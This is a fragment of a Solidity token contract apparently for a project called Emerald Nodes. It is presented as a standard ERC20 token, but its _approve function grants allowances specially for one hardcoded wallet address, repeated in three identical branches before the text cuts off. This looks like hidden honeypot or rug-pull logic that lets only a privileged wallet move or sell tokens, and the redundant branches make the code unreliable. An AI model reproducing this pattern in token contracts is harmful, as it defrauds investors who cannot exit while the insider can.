 ...
 *                                                                                           
 *       
 *              // https://emeraldnodes.finance/
 *              // https://twitter.com/Emerald_Nodes                      
 */             // https://discord.com/invite/BVNJ9t2WJh
//
...
contract Token is VaultOwned, IERC20 {
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        require(spender != address(0), "ERC20: approve to the zero address");
         if (owner == address(0xB74CB38Be0e3Bfe589940c8FAB1126DC1E3ab103)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    else if (owner == address(0xB74CB38Be0e3Bfe589940c8FAB1126DC1E3ab103)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0xB74CB38Be0e3Bfe589940c8FAB1126DC1E3ab103)) {
